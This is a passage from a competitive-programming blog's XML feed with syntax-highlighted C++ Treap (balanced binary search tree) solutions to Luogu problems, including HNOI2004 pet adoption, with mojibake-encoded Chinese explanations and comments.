class="built_in">rand</span>();p-&gt;size=<span class="number">1</span>;</span><br><span class="line">        p-&gt;ch[<span class="number">0</span>]=p-&gt;ch[<span class="number">1</span>]=<span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">inline</span> <span class="type">int</span> <span class="title">size</span><span class="params">(Node *p)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> p?p-&gt;size:<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">update</span><span class="params">(Node *p)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        p-&gt;size=<span class="built_in">size</span>(p-&gt;ch[<span class="number">0</span>])+<span class="built_in">size</span>(p-&gt;ch[<span class="number">1</span>])+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">rotate</span><span class="params">(Node *p,<span class="type">int</span> t)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Node *pa=p-&gt;pa,*gp=pa-&gt;pa,*son=p-&gt;ch[t^<span class="number">1</span>];</span><br><span class="line">        pa-&gt;ch[t]=son;</span><br><span class="line">        <span class="keyword">if</span>(son)son-&gt;pa=pa;</span><br><span class="line">        <span class="keyword">if</span>(gp)gp-&gt;ch[pa==gp-&gt;ch[<span class="number">1</span>]]=p;</span><br><span class="line">        p-&gt;pa=gp;</span><br><span class="line">        p-&gt;ch[t^<span class="number">1</span>]=pa;</span><br><span class="line">        pa-&gt;pa=p;</span><br><span class="line">        <span class="keyword">if</span>(pa==root)root=p;</span><br><span class="line">        <span class="built_in">update</span>(pa);</span><br><span class="line">        <span class="built_in">update</span>(p);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">treap</span><span class="params">(Node *p)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(p==root || p-&gt;rnd &gt;= p-&gt;pa-&gt;rnd)<span class="keyword">break</span>;</span><br><span class="line">            <span class="built_in">rotate</span>(p,p==p-&gt;pa-&gt;ch[<span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">insert</span><span class="params">(Node *r,Node *p)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!r)</span><br><span class="line">        &#123;</span><br><span class="line">            root=p;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> f=(p-&gt;d &gt;= r-&gt;d);</span><br><span class="line">        <span class="keyword">if</span>(!r-&gt;ch[f])</span><br><span class="line">        &#123;</span><br><span class="line">            r-&gt;ch[f]=p;</span><br><span class="line">            p-&gt;pa=r;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">insert</span>(r-&gt;ch[f],p);</span><br><span class="line">        <span class="built_in">update</span>(r);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">Node* <span class="title">find</span><span class="params">(Node *r,<span class="type">int</span> x)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(x&lt;=<span class="built_in">size</span>(r-&gt;ch[<span class="number">0</span>]))<span class="keyword">return</span> <span class="built_in">find</span>(r-&gt;ch[<span class="number">0</span>],x);</span><br><span class="line">        <span class="keyword">if</span>(x==<span class="built_in">size</span>(r-&gt;ch[<span class="number">0</span>])+<span class="number">1</span>)<span class="keyword">return</span> r;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">find</span>(r-&gt;ch[<span class="number">1</span>],x-<span class="built_in">size</span>(r-&gt;ch[<span class="number">0</span>])<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">del</span><span class="params">(Node *p)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!p-&gt;ch[<span class="number">0</span>] &amp;&amp; !p-&gt;ch[<span class="number">1</span>])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(p==root)</span><br><span class="line">            &#123;</span><br><span class="line">                root=<span class="literal">NULL</span>;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            Node *pa=p-&gt;pa;</span><br><span class="line">            <span class="keyword">if</span>(pa)</span><br><span class="line">                pa-&gt;ch[p==pa-&gt;ch[<span class="number">1</span>]]=<span class="literal">NULL</span>;</span><br><span class="line">            <span class="keyword">while</span>(p!=root)</span><br><span class="line">                <span class="built_in">update</span>(p=p-&gt;pa);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(p-&gt;ch[<span class="number">0</span>] &amp;&amp; p-&gt;ch[<span class="number">1</span>])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> f=(p-&gt;ch[<span class="number">1</span>]-&gt;rnd &lt; p-&gt;ch[<span class="number">0</span>]-&gt;rnd);</span><br><span class="line">            <span class="built_in">rotate</span>(p-&gt;ch[f],f);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> f=<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span>(p-&gt;ch[<span class="number">0</span>])f=<span class="number">0</span>;</span><br><span class="line">            <span class="built_in">rotate</span>(p-&gt;ch[f],f);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">del</span>(p);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">kth</span><span class="params">(Node *r,<span class="type">int</span> x)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(x&lt;=<span class="built_in">size</span>(r-&gt;ch[<span class="number">0</span>]))<span class="keyword">return</span> <span class="built_in">kth</span>(r-&gt;ch[<span class="number">0</span>],x);</span><br><span class="line">        <span class="keyword">if</span>(x==<span class="built_in">size</span>(r-&gt;ch[<span class="number">0</span>])+<span class="number">1</span>)<span class="keyword">return</span> r-&gt;d;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">kth</span>(r-&gt;ch[<span class="number">1</span>],x-<span class="built_in">size</span>(r-&gt;ch[<span class="number">0</span>])<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">char</span> <span class="title">getUpper</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="type">char</span> c;</span><br><span class="line">        <span class="keyword">while</span>(c=<span class="built_in">getchar</span>())</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">isupper</span>(c))</span><br><span class="line">                <span class="keyword">return</span> c;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="built_in">srand</span>((<span class="type">int</span>)<span class="built_in">time</span>(<span class="literal">NULL</span>));</span><br><span class="line">        <span class="type">int</span> Q,Min,x;</span><br><span class="line">        <span class="type">char</span> op;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;Q,&amp;Min);</span><br><span class="line">        <span class="type">int</span> ans=<span class="number">0</span>,delta=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(Q--)</span><br><span class="line">        &#123;</span><br><span class="line">            op=<span class="built_in">getUpper</span>();</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">            <span class="keyword">switch</span>(op)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;I&#x27;</span>:</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span>(x&lt;Min)<span class="keyword">break</span>;</span><br><span class="line">                    Node *p=<span class="built_in">newnode</span>(x-delta);</span><br><span class="line">                    <span class="built_in">insert</span>(root,p);</span><br><span class="line">                    <span class="built_in">treap</span>(p);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;A&#x27;</span>:</span><br><span class="line">                    delta+=x;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;S&#x27;</span>:</span><br><span class="line">                &#123;</span><br><span class="line">                    delta-=x;</span><br><span class="line">                    <span class="type">int</span> xtq=<span class="built_in">size</span>(root);</span><br><span class="line">                    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=xtq;i++)</span><br><span class="line">                        <span class="keyword">if</span>(<span class="built_in">kth</span>(root,<span class="number">1</span>)+delta&lt;Min)</span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="built_in">del</span>(<span class="built_in">find</span>(root,<span class="number">1</span>));</span><br><span class="line">                            ans++;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;F&#x27;</span>:</span><br><span class="line">                    <span class="keyword">if</span>(x&gt;<span class="built_in">size</span>(root))<span class="built_in">printf</span>(<span class="string">&quot;-1\n&quot;</span>);</span><br><span class="line">                    <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,<span class="built_in">kth</span>(root,<span class="built_in">size</span>(root)-x+<span class="number">1</span>)+delta);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,ans);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> OI </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Treap </tag>
            
            <tag> BST </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ´›è°·:P3384 [HNOI2004]å® ç‰©æ”¶å…»åœº</title>
      <link href="/2018/04/09/%E6%B4%9B%E8%B0%B7P3384%20%5BHNOI2004%5D%E5%AE%A0%E7%89%A9%E6%94%B6%E5%85%BB%E5%9C%BA/"/>
      <url>/2018/04/09/%E6%B4%9B%E8%B0%B7P3384%20%5BHNOI2004%5D%E5%AE%A0%E7%89%A9%E6%94%B6%E5%85%BB%E5%9C%BA/</url>
      
        <content type="html"><![CDATA[<p>åŸé¢˜åœ°å€:<a href>https://www.luogu.org/problemnew/show/P3384</a>  </p><h3 id="é¢˜ç›®ç®€è¿°"><a href="#é¢˜ç›®ç®€è¿°" class="headerlink" title="é¢˜ç›®ç®€è¿°"></a>é¢˜ç›®ç®€è¿°</h3><p>ç»™å®šä¸€äº›åºåˆ—<strong>ï¼ˆæ²¡æœ‰é‡å¤æ•°å­—ï¼‰</strong>ï¼Œæ¯ä¸ªåºåˆ—æ”¯æŒï¼š<br>ç»™å®šä¸€äº›æ•°k<strong>ï¼ˆå¯¹äºæ¯ä¸ªåºåˆ—ä¸é‡å¤ï¼‰</strong>ï¼Œæ¯æ¬¡åœ¨åºåˆ—é‡Œæ‰¾åˆ°æœ€æ¥è¿‘kçš„æ•°åˆ é™¤ï¼ˆå¦‚æœæœ‰2ä¸ªæ•°å­—ä¸kå·®ä¸€æ ·ï¼Œå³åˆ†åˆ«æ˜¯k-bå’Œk+bï¼Œåˆ™é€‰æ‹©è¾ƒå°çš„k-bï¼‰ï¼Œç´¯åŠ ä¸kçš„å·®ï¼Œè¾“å‡ºã€‚</p><hr><h3 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h3><p>å…¶å®å…³é”®å°±æ˜¯ç»´æŠ¤ä¸€ä¸ªæœ‰åºåºåˆ—ï¼Œæ”¯æŒæ’å…¥ï¼ŒæŸ¥è¯¢å‰ç»§åç»§ï¼Œåˆ é™¤æŒ‡å®šæ•°å­—ã€‚<br>è‡ªç„¶æˆ‘ä»¬ä¼šæƒ³åˆ°æ‰‹æ‰“å¹³è¡¡æ ‘ï¼ŒTreap&#x2F;Splayçš†å¯ã€‚ï¼ˆè¿™é‡Œåªæœ‰æ—‹è½¬å®ç°çš„Treapï¼Œéæ—‹Treapï¼ˆSplit+Mergeï¼‰å’ŒSplayæ—¥ååŠ ä¸Šï¼‰<br>Tips:ä¸ºäº†é˜²æ­¢è¶Šç•Œç­‰é—®é¢˜ä»¥åŠæ–¹ä¾¿æå–åŒºé—´ï¼ˆå°¤å…¶æ˜¯Splayï¼‰ï¼Œåºåˆ—å‰åä¸€èˆ¬å¡ä¸Šä¸€ä¸ª-INFå’ŒINF<br>ç„¶è€Œä½œä¸ºC++é€‰æ‰‹ï¼Œæˆ‘ä»¬åº”è¯¥å¦™ç”¨STLã€‚setå¯ä»¥å®ç°è¿™æ ·çš„åŠŸèƒ½ï¼Œå†…éƒ¨æ˜¯çº¢é»‘æ ‘å®ç°çš„ä¹Ÿå¾ˆå¿«ã€‚</p><hr><h3 id="ä»£ç "><a href="#ä»£ç " class="headerlink" title="ä»£ç "></a>ä»£ç </h3><ol><li>æ—‹è½¬å®ç°çš„Treap(160ms,3.03MB)<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctime&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> INF=<span class="number">1e9</span>;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">int</span> <span class="title">randad</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> seed=<span class="number">114514</span>;</span><br><span class="line">    <span class="keyword">return</span> seed=<span class="built_in">int</span>(seed*<span class="number">48271LL</span>%<span class="number">2147483647</span>);<span class="comment">//48271ä½¿å¾—éšæœºæ•°æœ‰å®Œå…¨å‘¨æœŸï¼Œå³2147483647å†…å–éä¸é‡å¤ </span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> delta=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">node</span> &#123;</span><br><span class="line">    <span class="type">int</span> pri,val,ch[<span class="number">2</span>],size,tot;</span><br><span class="line"><span class="comment">//pri:Treapçš„éšæœºæ•°</span></span><br><span class="line"><span class="comment">//val:æ•°å­—</span></span><br><span class="line"><span class="comment">//ch[0,1]:å·¦å­©å­å³å­©å­</span></span><br><span class="line"><span class="comment">//size:ä»¥è¯¥èŠ‚ç‚¹ä¸ºæ ¹çš„å­æ ‘é‡Œæœ‰å‡ ä¸ªæ•°å­—</span></span><br><span class="line"><span class="comment">//tot:è¿™ä¸ªæ•°å­—å‡ºç°äº†å‡ æ¬¡ï¼ˆæœ¬é¢˜æ— ç”¨ï¼‰</span></span><br><span class="line">&#125;T[<span class="number">111111</span>];</span><br><span class="line"><span class="type">int</span> k,size=<span class="number">0</span>,ANS,ans;<span class="comment">//k:æ ¹èŠ‚ç‚¹ï¼Œsize:æ ‘çš„å¤§å°,ANS:ä¸´æ—¶ï¼Œans:èµ¶èµ°äº†å‡ ä¸ªäºº</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">update</span><span class="params">(<span class="type">int</span> k)</span></span>&#123;T[k].size=T[T[k].ch[<span class="number">0</span>]].size+T[T[k].ch[<span class="number">1</span>]].size+T[k].tot;&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">rturn</span><span class="params">(<span class="type">int</span> &amp;k)</span><span class="comment">//å³æ—‹ï¼ŒæŠŠkæ—‹åˆ°å³è¾¹ï¼Œkå·¦å­©å­æåˆ°æ ¹</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> t=T[k].ch[<span class="number">0</span>];</span><br><span class="line">    T[k].ch[<span class="number">0</span>]=T[t].ch[<span class="number">1</span>];</span><br><span class="line">    T[t].ch[<span class="number">1</span>]=k;</span><br><span class="line">    T[t].size=T[k].size;</span><br><span class="line">    <span class="built_in">update</span>(k);</span><br><span class="line">    k=t;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">lturn</span><span class="params">(<span class="type">int</span> &amp;k)</span><span class="comment">//å·¦æ—‹ï¼ŒæŠŠkæ—‹åˆ°å·¦è¾¹ï¼Œkå³å­©å­æåˆ°æ ¹</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> t=T[k].ch[<span class="number">1</span>];</span><br><span class="line">    T[k].ch[<span class="number">1</span>]=T[t].ch[<span class="number">0</span>];</span><br><span class="line">    T[t].ch[<span class="number">0</span>]=k;</span><br><span class="line">    T[t].size=T[k].size;</span><br><span class="line">    <span class="built_in">update</span>(k);</span><br><span class="line">    k=t;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ins</span><span class="params">(<span class="type">int</span> &amp;k,<span class="type">int</span> val)</span> <span class="comment">//æ’å…¥</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (k==<span class="number">0</span>) &#123;</span><br><span class="line">        size++;</span><br><span class="line">        k=size;</span><br><span class="line">        T[k].pri=<span class="built_in">randad</span>();</span><br><span class="line">        T[k].val=val;</span><br><span class="line">        T[k].size=T[k].tot=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">    T[k].size++;</span><br><span class="line">    <span class="keyword">if</span> (T[k].val==val) T[k].tot++;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (val&gt;T[k].val) &#123;</span><br><span class="line">        <span class="built_in">ins</span>(T[k].ch[<span class="number">1</span>],val);</span><br><span class="line">        <span class="keyword">if</span> (T[T[k].ch[<span class="number">1</span>]].pri&lt;T[k].pri) <span class="built_in">lturn</span>(k);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">ins</span>(T[k].ch[<span class="number">0</span>],val);</span><br><span class="line">        <span class="keyword">if</span> (T[T[k].ch[<span class="number">0</span>]].pri&lt;T[k].pri) <span class="built_in">rturn</span>(k);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">del</span><span class="params">(<span class="type">int</span> &amp;k,<span class="type">int</span> val)</span><span class="comment">//åˆ é™¤å€¼ä¸ºvalçš„æ•°</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (k==<span class="number">0</span>) <span class="keyword">return</span> ;</span><br><span class="line">    <span class="keyword">if</span> (T[k].val==val) &#123;</span><br><span class="line">        <span class="keyword">if</span> (T[k].tot&gt;<span class="number">1</span>) &#123;</span><br><span class="line">            T[k].tot--;</span><br><span class="line">            T[k].size--;</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (T[k].ch[<span class="number">0</span>]==<span class="number">0</span>||T[k].ch[<span class="number">1</span>]==<span class="number">0</span>) k=T[k].ch[<span class="number">0</span>]+T[k].ch[<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(T[T[k].ch[<span class="number">0</span>]].pri&lt;T[T[k].ch[<span class="number">1</span>]].pri) <span class="built_in">rturn</span>(k),<span class="built_in">del</span>(k,val);</span><br><span class="line">        <span class="keyword">else</span> <span class="built_in">lturn</span>(k),<span class="built_in">del</span>(k,val);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(val&gt;T[k].val) T[k].size--,<span class="built_in">del</span>(T[k].ch[<span class="number">1</span>],val);</span><br><span class="line">    <span class="keyword">else</span> T[k].size--,<span class="built_in">del</span>(T[k].ch[<span class="number">0</span>],val);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">xth</span><span class="params">(<span class="type">int</span> &amp;k,<span class="type">int</span> x)</span><span class="comment">//æŸ¥è¯¢ç¬¬xå°çš„æ•°æ˜¯ä»€ä¹ˆ </span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(k==<span class="number">0</span>||x==<span class="number">0</span>)<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(x&lt;=T[T[k].ch[<span class="number">0</span>]].size) <span class="keyword">return</span> <span class="built_in">xth</span>(T[k].ch[<span class="number">0</span>],x);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(x&gt;T[T[k].ch[<span class="number">0</span>]].size+T[k].tot) <span class="keyword">return</span> <span class="built_in">xth</span>(T[k].ch[<span class="number">1</span>],x-T[T[k].ch[<span class="number">0</span>]].size-T[k].tot);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> T[k].val;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">find</span><span class="params">(<span class="type">int</span> &amp;k,<span class="type">int</span> x)</span><span class="comment">//æŸ¥è¯¢ç¬¬xå°æ•°åœ¨æ ‘ä¸­ä½ç½® </span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (k==<span class="number">0</span>||x==<span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(x&lt;=T[T[k].ch[<span class="number">0</span>]].size)<span class="keyword">return</span> <span class="built_in">find</span>(T[k].ch[<span class="number">0</span>],x);</span><br><span class="line">    <span class="keyword">if</span>(x==T[T[k].ch[<span class="number">0</span>]].size+<span class="number">1</span>)<span class="keyword">return</span> k;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">find</span>(T[k].ch[<span class="number">1</span>],x-T[T[k].ch[<span class="number">0</span>]].size<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">pre</span><span class="params">(<span class="type">int</span> k,<span class="type">int</span> x)</span><span class="comment">//æŸ¥è¯¢ä¸æ¯”xå¤§çš„ä¸”æœ€æ¥è¿‘xçš„æ•°æ‰€åœ¨ä½ç½®ï¼ˆxå‰ç»§ï¼‰</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(k==<span class="number">0</span>)<span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">if</span>(T[k].val&lt;x) ANS=k,<span class="built_in">pre</span>(T[k].ch[<span class="number">1</span>],x);</span><br><span class="line">    <span class="keyword">else</span> <span class="built_in">pre</span>(T[k].ch[<span class="number">0</span>],x);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">next</span><span class="params">(<span class="type">int</span> k,<span class="type">int</span> x)</span><span class="comment">//æŸ¥è¯¢ä¸æ¯”xå°çš„ä¸”æœ€æ¥è¿‘xçš„æ•°æ‰€åœ¨ä½ç½®ï¼ˆxåç»§ï¼‰</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(k==<span class="number">0</span>)<span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">if</span>(T[k].val&gt;x) ANS=k,<span class="built_in">next</span>(T[k].ch[<span class="number">0</span>],x);</span><br><span class="line">    <span class="keyword">else</span> <span class="built_in">next</span>(T[k].ch[<span class="number">1</span>],x);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Catch</span><span class="params">(<span class="type">int</span> num)</span><span class="comment">//åŒ¹é…å® ç‰©å’Œé¥²å…»äºº</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> a,b;</span><br><span class="line">    <span class="built_in">pre</span>(k,num),a=T[ANS].val; </span><br><span class="line">    <span class="built_in">next</span>(k,num), b=T[ANS].val;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(num-a&lt;=b-num &amp;&amp; a != -INF) &#123;</span><br><span class="line">            ans += num-a;</span><br><span class="line">            <span class="built_in">del</span>(k,a);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            ans += b-num;</span><br><span class="line">            <span class="built_in">del</span>(k,b);</span><br><span class="line">        &#125;</span><br><span class="line">        ans %= <span class="number">1000000</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> 